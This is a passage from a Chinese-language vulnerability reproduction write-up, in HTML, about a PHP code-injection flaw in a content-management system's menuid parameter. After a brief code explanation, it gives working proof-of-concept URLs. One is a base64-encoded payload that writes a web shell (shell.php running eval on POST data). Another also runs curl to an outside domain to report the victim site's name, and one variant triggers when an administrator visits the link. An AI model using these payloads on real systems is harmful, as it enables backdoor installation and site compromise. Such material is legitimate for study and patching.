$str2, $showlevel, $style, $currentlevel+1, TRUE);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第二次执行的时候</span><span class="cs9FB05234">$myid</span><span class="cs9C1B1871">由</span><span class="cs8926E06">0</span><span class="cs9C1B1871">变成了</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这时候的</span><span class="cs9FB05234">$newarr</span><span class="cs9C1B1871">为空，</span></p><p class="cs40DD2BC9"><span class="cs8926E06">if</span><span class="cs9C1B1871">就不执行，转而执行</span><span class="cs8926E06">elseif</span><span class="cs9C1B1871">和</span><span class="cs8926E06">else</span><span class="cs9C1B1871">，而</span><span class="cs9FB05234">$str</span><span class="cs9C1B1871">包含着</span><span class="cs9FB05234">menuid</span><span class="cs9C1B1871">的值，也就是</span><span class="cs9FB05234">${@phpinfo()}</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，这时候</span><span class="cs9FB05234">eval()</span><span class="cs8926E06"> </span><span class="cs9C1B1871">就执行了</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="csE3F655E4">常规</span><span class="cs5BEC2C28">poc</span><span class="csE3F655E4">：</span><span class="cs9FB05234">https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=${@phpinfo()}</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">进阶版</span><span class="cs5BEC2C28">poc</span><span class="csE3F655E4">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=${@(assert(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycpOw)))}</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">密码</span><span class="cs8926E06">1</span><span class="cs9C1B1871">，这要管理员权限才能代码执行，修改下</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，管理员一访问就在当前域名的首页路径下生成</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">print_r(base64_encode(&quot;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval(\$_POST[2]);&#39;);system(&#39;curl &#39;.\$_SERVER[\&quot;SERVER_NAME\&quot;].&#39;www.0-sec.org&#39;);&quot;));</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">还有另一种</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，会回显的提醒。自动</span><span class="cs8926E06">curl</span><span class="cs9C1B1871">请求你的域名，然后回显网站</span><span class="cs8926E06">url</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">先输出</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">的地址，然后在替换下面的字符串</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://www.0-sec.org/index.php?m=content&amp;c=content&amp;a=public_categorys&amp;menuid=(${@(assert(eval(base64_decode(ZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD9waHAgZXZhbCgkX1BPU1RbMl0pOycpO3N5c3RlbSgnY3VybCAnLiRfU0VSVkVSWyJTRVJWRVJfTkFNRSJdLic0MzIxLm5yY3VmOS5jZXllLmlvJyk7))))})</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这个字符串有几个点提醒下自己，</span><span class="cs9FB05234"> assert()</span><span class="cs9C1B1871">函数执行执行一句</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码，所以在</span><span class="cs8926E06">assert</span><span class="cs9C1B1871">前面加个</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">，执行多条语句。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.mrwu.red/web/2723.html</span></p></body>
</html>
